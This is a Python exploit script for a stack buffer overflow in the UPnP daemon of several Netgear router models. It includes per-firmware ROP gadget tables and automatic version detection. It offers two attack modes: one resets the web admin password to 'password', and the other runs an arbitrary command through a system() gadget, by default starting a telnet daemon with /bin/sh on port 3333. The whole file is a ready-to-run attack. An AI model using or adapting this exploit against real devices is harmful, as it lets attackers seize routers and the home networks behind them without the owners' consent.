import sys, time, socket, struct, argparse, os, shutil

if sys.version_info[0] != 3:
    print("Please run the exploit in python3")
    sys.exit(1)

###########################################################################
## Version Info ###########################################################
###########################################################################

# Gadget addresses which sets the HTTP admin's password to "password"
password_reset_gadgets = {
	"R7000" : {
		"11.100" : 0x3E1B0,
		"11.106" : 0x3DCC8,
		"11.110" : 0x3DCC8,
		# Not vulnerable due to broken functionality
		#"11.116" : 0x3E1F0,
		#"11.123" : 0x3E1F0,
	},
	"XR300" : {
		# upnpd listens on port 56688 on the XR300 (soapd on port 5000 isn't vulnerable)
		"1.0.3.56" : 0x37B6C,
		"1.0.3.38" : 0x37D24,
	}
}

# Address/padding info necessary for running an arbitrary command
rce_gadgets = {
	"XR300" : {
		# upnpd listens on port 56688 on the XR300 (soapd on port 5000 isn't vulnerable)
		"1.0.3.56" : {
			"stack_add_gadget"   : 0x134A8, # ADD SP, SP, #0x1000; LDMFD SP!, {R4-R7,PC}
			"padding1"           : 1292,    # Amount of stack space before the second stack frame
			"command_address"    : 0x5B748, # Address of the command to run (after priming)
			"padding2"           : 12,      # Amount of space between command_address and system_gadget during second ROP gadget
			"system_gadget"      : 0x2e7e0, # Address of the system gadget (MOV R0, R4; BL system)
		}
	},
	"R6700V3" : {
		"1.0.4.118" : {
			"stack_add_gadget"   : 0x21F34, # ADD SP, SP, #0x1000; LDMFD SP!, {R4-R7,PC}
			"padding1"           : 1304,    # Amount of stack space before the second stack frame
			"command_address"    : 0x66AD0, # Address of the command to run (after priming)
			"padding2"           : 12,      # Amount of space between command_address and system_gadget during second ROP gadget
			"system_gadget"      : 0x18150, # Address of the system gadget (MOV R0, R4; BL system)
		}
	}
}

# A mapping of human friendly versions to the versions returned by currentsetting.htm
firmware_version_to_human_version = {
	"R7000" : {
		"V1.0.11.100_10.2.100" : "11.100",
		"V1.0.11.106_10.2.100" : "11.106",
		"V1.0.11.110_10.2.100" : "11.110",
		"V1.0.11.116_10.2.100" : "11.116",
		"V1.0.11.123_10.2.100" : "11.123",
	},
	"XR300" : {
		"V1.0.3.56_10.3.41"    : "1.0.3.56",
		"V1.0.3.38_10.3.30"    : "1.0.3.38",
	},
	"R6700V3" : {
		"V1.0.4.118_10.0.90"   : "1.0.4.118",
	},
}

# The default command, spawns a telnet daemon on TCP port 3333
default_commands = {
	"R7000"     : "/bin/utelnetd -p3333 -l/bin/sh -d",
	"XR300"     : "/bin/utelnetd -p3333 -l/bin/sh -d",
	"R6700V3"   : "/bin/utelnetd -p3333 -l/bin/sh -d",
}

###########################################################################
## Functions ##############################################################
###########################################################################

def send(ip, port, is_https, payload, keep_open = False):
	if is_https:
		return send_ssl(ip, port, payload, keep_open)
	else:
		return send_plain(ip, port, payload, keep_open)

def send_plain(ip, port, payload, keep_open):
	sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.connect((ip, port))
	sock.send(payload)
	time.sleep(1)
	if keep_open:
		return sock
	sock.close()

def send_ssl(ip, port, payload, keep_open):
	import ssl
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	wrappedSocket = ssl.wrap_socket(sock)
	wrappedSocket.connect((ip, port))
	wrappedSocket.send(payload)
	time.sleep(1)
	if keep_open:
		return wrappedSocket
	wrappedSocket.close()

def s2b(s):
    return bytes(ord(x) for x in s)

def p32(address):
	return struct.pack("<I", address)

def find_item(contents, start_string):
	start = contents.find(start_string)
	if(start == -1):
		print("Failed to automatically detect version.")
		sys.exit(1)

	start += len(start_string)
	end = contents.find(b"\r\n", start)
	return contents[start:end].upper() # upper just in case

def detect_model_version(ip, port, is_https):
    request = b"GET /currentsetting.htm HTTP/1.1\r\n\r\n"
    sock = send(ip, port, is_https, request, True)

    contents = b""
    while True:
        if data := sock.recv(2048):
            contents += data

        else:
            break
    # Some older models/versions don't have the currentsetting.htm page, or it's protected by login
    if contents.find(b"401 Unauthorized") != -1:
    	print("Version detection against this router is not possible using currentsetting.htm.\n")
    	print("Received response:\n")
    	print(contents)
    	sys.exit(1)

    model = find_item(contents, b"Model=").decode("ASCII")
    firmware_version = find_item(contents, b"Firmware=").decode("ASCII")

    if (model not in firmware_version_to_human_version.keys() or
    firmware_version not in firmware_version_to_human_version[model]):
        print(f"Unknown model and version: {model} {firmware_version}")
        sys.exit(1)

    return model, firmware_version_to_human_version[model][firmware_version]

###########################################################################
## Main Execution #########################################################
###########################################################################

def get_payload(args):
    payload  = b'UNSUBSCRIBE /Public_UPNP_Event_1 HTTP/1.1\r\n'
    payload += s2b(f'Host: http://{args.ip}:{args.port}\r\n')
    payload += b'SID: whatever\r\n'
    payload += b'UUID: ' + b"A"*67
    payload += b'BBBB'
    payload += b'CCCC'
    payload += b'DDDD'
    payload += b'EEEE'
    payload += b'FFFF'
    payload += b'GGGG'
    payload += b'HHHH'
    payload += b'IIII'
    return payload

def reset_password_exploit(args):
    	# Check to make sure we support this firmware
    if args.model not in password_reset_gadgets or args.version not in password_reset_gadgets[args.model]:
        print(f"Unknown model {args.model} or version {args.version}")
        sys.exit(1)

    payload = get_payload(args)

    # Little endian address, so we leave off the last byte (the MSB), which is 0
    payload += p32(password_reset_gadgets[args.model][args.version])[:3]
    payload += b'\r\n\r\n'

    send(args.ip, args.port, False, payload)

def set_command(args):
    """Writes the command to memory in a global variable (meant for holding the
		Body of the XML request)"""
    payload =  b'<?xml version="1.0"?> '
    payload += b'<SOAP-ENV:Envelope> '
    payload += b'Body>:'
    payload += s2b(args.command.replace(" ","${IFS}"))
    payload += b';Body >'
    payload += b" </SOAP-ENV:Body> "
    payload += b"</SOAP-ENV:Envelope>"

    request  = b'POST /Public_UPNP_C5 HTTP/1.1\r\n'
    request += s2b(f'Host: http://{args.ip}:{args.port}\r\n')
    request += b'SOAPAction\r\n'
    request += s2b(f'Content-Length: {len(payload)}\r\n')
    request += b'\r\n'
    request += payload

    send(args.ip, args.port, False, request)

def rce_exploit(args):
    	# Check to make sure we support this firmware
    if args.model not in rce_gadgets or args.version not in rce_gadgets[args.model]:
        print(f"Unknown model {args.model} or version {args.version}")
        sys.exit(1)

    # Resolve the default command
    USING_DEFAULT_COMMAND = (args.command == "START_TELNET")
    if USING_DEFAULT_COMMAND:
    	# Resolve the default command (which may be specific to a version)
    	args.command = default_commands[args.model]
    	if type(args.command) != str:
    		args.command = args.command[args.version]

    # Get the version-specific address information that we'll need for the exploit
    stack_add_gadget = p32(rce_gadgets[args.model][args.version]["stack_add_gadget"])
    padding1         = rce_gadgets[args.model][args.version]["padding1"]
    command_address  = p32(rce_gadgets[args.model][args.version]["command_address"])
    padding2         = rce_gadgets[args.model][args.version]["padding2"]
    system_gadget    = p32(rce_gadgets[args.model][args.version]["system_gadget"])

    payload = get_payload(args)
    # Little endian address, so we leave off the last byte (the MSB), which is 0
    payload += stack_add_gadget[:3]
    payload += b'\r\n\r\n'

    # Pad the request so we can match up with the stack add gadget
    payload += b'J' * (padding1 - len(payload))
    # Then do a system(command) gadget
    payload += command_address
    payload += b'K' * padding2
    payload += system_gadget

    set_command(args)
    send(args.ip, args.port, False, payload)

def main(args):
    if args.version == "" or args.model == "":
        args.model, args.version = detect_model_version(args.ip, args.http_port, args.https)
        print(f"Automatically detected model {args.model} and version {args.version}")

    if args.version_only:
    	sys.exit(1)

    if args.rce_exploit:
    	rce_exploit(args)
    else:
    	reset_password_exploit(args)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Run the exploit')
    parser.add_argument('ip', type=str, default=None, help='The IP address of the device to exploit')
    parser.add_argument('-command', type=str, default="START_TELNET", help='The command to run; default is to start telnet on port 3333')
    parser.add_argument('-https', required=False, action='store_true', help='Use HTTPS when gathering the version from the webserver')
    parser.add_argument('-http_port', type=int, default=80, help='The port of the webserver to gather the version')
    parser.add_argument('-port', type=int, default=5000, help='The port of the upnp to exploit')
    parser.add_argument(
        '-model',
        type=str,
        default="",
        help=(
            'The model of the device to exploit (default autodetect via the webserver).'
            + f' Supported models are: {", ".join(password_reset_gadgets.keys())}'
        ),
    )

    parser.add_argument(
        '-version',
        type=str,
        default="",
        help=(
            'The version of the device to exploit (default autodetect via the webserver).'
            + f""" Supported versions are: {"; ".join([f'{x}: {", ".join(password_reset_gadgets[x])}' for x in password_reset_gadgets.keys()])}"""
        ),
    )

    parser.add_argument('-version-only', required=False, action='store_true', help="Only detect the model/version of a device, don't exploit")
    parser.add_argument('-rce-exploit', required=False, action='store_true', help="Run the RCE exploit, rather than the password reset exploit. Supports less images")
    args = parser.parse_args()
    args.model = args.model.upper()

    main(args)

